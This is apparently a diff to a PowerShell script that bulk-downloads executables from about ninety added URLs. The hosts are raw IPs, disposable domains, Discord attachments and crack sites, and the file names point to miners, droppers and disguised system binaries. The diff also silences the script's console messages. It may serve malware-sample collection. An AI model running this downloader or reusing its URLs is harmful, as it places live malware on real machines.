@@ -164,7 +164,99 @@ $urls = @(
     "http://77.91.124.40/info/photo540.exe",
     "https://crackload.net/download/Heat%20Up%203%20VST%20Crack%20MAC%20Incl%20[Keygen%20%20Torrent]%20Free%20Download%20Downloader.zip",
     "https://5tfgbgf6yjhg.cfd/mf1TDEFj0UouIv3JPWORKylaQ8NGqt249/?k=16&meta=CCleaner-Pro-6-05-10110-Crack-With-Full-License-Keygen-2022",
-    "https://weokd09rt.one/wsdZ8Elu62nVqWx4mJNayehL7TrQXUoDM/30/Sony-Vegas-Pro-17-Crack-Keygen---Serial-Number-Free-Download---ProductkeyFree"
+    "https://weokd09rt.one/wsdZ8Elu62nVqWx4mJNayehL7TrQXUoDM/30/Sony-Vegas-Pro-17-Crack-Keygen---Serial-Number-Free-Download---ProductkeyFree",
+    "https://datamicrotransfer.com/rx.exe",
+    "http://193.239.147.224/crytp.exe",
+    "http://gxbrowser.net/update.exe",
+    "http://148.251.22.110:7766/kKynRYEA8MnW.exe",
+    "http://149.3.170.56/test.exe",
+    "http://103.124.106.203/cof4/inst.exe",
+    "http://c.oooooooooo.ga:443/o/cpu32.exe",
+    "http://c.oooooooooo.ga:443/o/cpu64.exe",
+    "http://58.218.67.253:281/1.exe",
+    "http://58.218.67.253:281/2228.exe",
+    "http://58.218.67.253:281/2.exe",
+    "http://94.103.94.2/miner_scrooges.exe",
+    "https://cdn.discordapp.com/attachments/748623447315185756/811474999222206464/newxmr.exe",
+    "http://176.123.7.127/id210131/phpguard.exe",
+    "http://91.208.245.32:443/SQLSerase.exe",
+    "http://91.208.245.32:443/ReportServser.exe",
+    "http://45.144.225.65/update.exe",
+    "http://185.215.113.93/xmr.exe",
+    "http://45.133.1.139/PlayerUI5.exe",
+    "http://45.82.72.148/nslookup.exe",
+    "http://194.147.142.230/download/activation.exe",
+    "http://194.147.142.230/download/activationeth.exe",
+    "http://b4ad7b79-534a-4e83-953e-c36da8cf27d9.s3.amazonaws.com/WW/Setup.exe",
+    "https://bitbucket.org/mminminminmin05/testtest/downloads/3.exe",
+    "http://51.89.77.2/plesk-site-preview/web106-9872.gh.schleyer-edv.space/https/51.89.77.2/LinkMiner.exe",
+    "http://45.144.225.135/notepad.exe",
+    "http://45.144.225.135/godeth.exe",
+    "http://34.126.93.163/xm/kch.com",
+    "http://34.126.93.163/xm/64a1.com",
+    "http://34.126.93.163/xm/x64.com",
+    "http://redm1az1.000webhostapp.com/wp-content/uploads/2021/03/dazxc.exe",
+    "http://93.157.63.213/drunk.exe",
+    "http://93.157.63.204/drunk.exe",
+    "http://hirezz.com/test/includes/fw3.exe",
+    "http://93.157.63.205/drunk.exe",
+    "http://45.144.225.135/ntdw1.exe",
+    "http://45.144.225.135/taskhost.exe",
+    "http://45.144.225.135/obf.exe",
+    "http://107.172.214.23:1234/svhostd.jpg",
+    "http://worldexpressdelivery.art/GoogleCrashHandler32.exe",
+    "http://vafc.top/dl/build.exe",
+    "http://212.192.241.136/files/file1.exe",
+    "https://cdn.discordapp.com/attachments/847817431246307331/849751254832906281/RuntimeBroker.exe",
+    "http://179.43.140.150/koze/update.exe",
+    "https://cdn.discordapp.com/attachments/850181846302195745/851880405329379368/98989898.exe",
+    "https://furyx.de/NitroGen.exe",
+    "http://136.144.41.164/setup.exe",
+    "http://squeezydeveloper.xyz/xnetworkloader.exe",
+    "http://45.144.225.135/msiexec.exe",
+    "http://141.95.28.201/start.exe",
+    "http://ahcteam.site/app.exe",
+    "http://185.26.113.95:8095/1201.dat",
+    "http://54.169.72.214/mmm/rst.exe",
+    "http://1freeprivacytoolsforyou.xyz/downloads/toolspab2.exe",
+    "https://qmumdjffuiocstjfmdqt.com/test5.exe",
+    "https://qmumdjffuiocstjfmdqt.com/miner.EXE",
+    "http://lastimaners.ug/zxcvb.exe",
+    "http://83.220.173.160/Datafile64.exe",
+    "http://lastimaners.ug/asdf.EXE",
+    "http://lastimaners.ug/asdfg.exe",
+    "http://lastimaners.ug/zxcv.EXE",
+    "https://oneup.cc/download/nvcontainer1.exe",
+    "https://cdn.discordapp.com/attachments/785433297588846605/861477299832094731/xmrnoadmin.exe",
+    "http://135.125.172.201/svchost.exe",
+    "https://pcandtool.com/JoSetp.exe",
+    "http://silentlegion.duckdns.org/b.exe",
+    "http://89.41.182.90/images/plotterline.png",
+    "http://45.156.27.166/HZUWUM5pprq6yKV.exe",
+    "http://37.0.10.214/WW/file3.exe",
+    "https://anydesk-pc.website/iiirina1.exe",
+    "http://194.147.142.230/microsoft/deps/msedge.exe",
+    "http://81.16.141.193/5Yt9sCiDJCsigNC.exe",
+    "http://waskitaprecast.co.id/Explorer.exe",
+    "http://185.49.70.90:2080/5.php",
+    "http://privacytoolz123foryou.xyz/downloads/toolspab2.exe",
+    "http://37.0.10.214/WW/file8.exe",
+    "http://swretjhwrtj.gq/CPU.exe",
+    "http://168.100.8.24/2.exe",
+    "https://www.uplooder.net/f/tl/29/a90b09f975ab360e6acf31b6ef54e813/Explorer.exe",
+    "http://swretjhwrtj.gq/ZXCXZCsssssssssssASDFasdfEWSDFew.exe",
+    "https://cdn.discordapp.com/attachments/877059443307724803/879620860481253416/XMR.exe",
+    "http://a0572281.xsph.ru/tox.exe",
+    "http://a0572281.xsph.ru/hack.exe",
+    "http://a0572281.xsph.ru/hack1.exe",
+    "http://65.21.223.132/Ahiles.exe",
+    "http://109.94.209.121/6.php",
+    "http://f0571088.xsph.ru/system32.exe",
+    "http://45.150.115.32/Pluton.exe",
+    "https://thehairtransplantationturkey.tk/ilk.exe",
+    "http://81.163.246.9/rvn.exe",
+    "http://retracker.host/eth.exe"
+
 
 )
 
@@ -174,13 +266,15 @@ foreach ($url in $urls) {
     $fileName = [System.IO.Path]::GetFileName($url)
     $outputPath = Join-Path -Path $outputFolder -ChildPath $fileName
 
-    Write-Host "Downloading file from $url..."
+    # Write-Host "Downloading file from $url..."
+    $host.UI.RawUI.WindowTitle = "Downloading: $url ..."
+
     
     try {
         Invoke-WebRequest -Uri $url -OutFile $outputPath
         Write-Host "File downloaded successfully: $outputPath"
     } catch {
-        Write-Host "Failed to download file: $url"
+        # Write-Host "Failed to download file: $url"
     }
     
 }
